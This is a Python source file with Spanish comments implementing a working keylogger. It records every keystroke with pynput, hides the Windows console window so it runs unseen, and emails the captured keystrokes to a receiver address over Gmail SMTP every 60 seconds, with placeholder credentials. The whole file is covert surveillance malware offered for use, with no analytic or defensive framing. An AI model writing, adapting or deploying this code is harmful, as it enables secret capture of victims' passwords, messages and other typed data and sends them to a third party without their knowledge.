import smtplib
import time
import threading
import ctypes
from pynput import keyboard
from email.mime.text import MIMEText

# Configuración para el envío de correo electrónico
email_sender = 'correoremitente@gmail.com'
email_password = 'passwordauth' 
email_receiver = 'correodestino@gmail.com'

# Buffer para almacenar las pulsaciones del teclado
keys_buffer = []

def on_press(key):
    global keys_buffer

    try:
        key_char = key.char
        if key_char == ' ':
            key_char = '[SPACE]'
        keys_buffer.append(str(key_char))
    except AttributeError:
        special_key = str(key).split('.')[-1]
        keys_buffer.append(f'[{special_key.upper()}]')

def send_keys():
    global keys_buffer

    # Formateamos las pulsaciones almacenadas en el buffer
    keys = '\n'.join(keys_buffer)

    # Enviar por correo electrónico las pulsaciones capturadas
    try:
        subject = 'Pulsaciones de teclado registradas'
        message = f'Pulsaciones del teclado:\n\n{keys}'

        msg = MIMEText(message, 'plain', 'utf-8')  # Especificamos la codificación UTF-8
        msg['Subject'] = subject
        msg['From'] = email_sender
        msg['To'] = email_receiver

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_sender, email_password)
        server.sendmail(email_sender, email_receiver, msg.as_string())
        server.quit()

        
    except Exception as e:
        print(f"Error al enviar el correo electrónico: {str(e)}")

    # Limpiamos el buffer después de enviar los datos
    keys_buffer = []

def start_keylogger():
    # Configurar y comenzar el keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Ocultar la ventana de la consola (seguirá ejecutándose en segundo plano)
    hide_console = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.ShowWindow(hide_console, 0)

    # Crea y ejecuta un hilo para el keylogger
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Hilo para enviar las pulsaciones por correo cada cierto tiempo (por ejemplo, cada 60 segundos)
    send_keys_interval = 60  # segundos

    while True:
        send_keys()
        time.sleep(send_keys_interval)